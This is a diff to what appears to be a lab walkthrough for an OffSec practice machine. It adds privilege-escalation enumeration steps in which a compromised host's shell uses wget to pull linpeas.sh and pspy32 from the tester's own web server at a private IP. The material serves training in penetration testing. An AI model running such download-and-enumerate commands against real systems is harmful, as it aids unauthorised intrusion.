@@ -249,4 +249,13 @@ Linpeas
 ```shell
 > python -m http.server 80
 ```
+```shell
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/wget http://192.168.45.198/linpeas.sh
+```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4849942c-9d08-4f49-99f1-d19fa2cc3a40)
+Did not find anything interesting.
+
+PSPY
+```shell
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/wget http://192.168.45.198/pspy32
+```
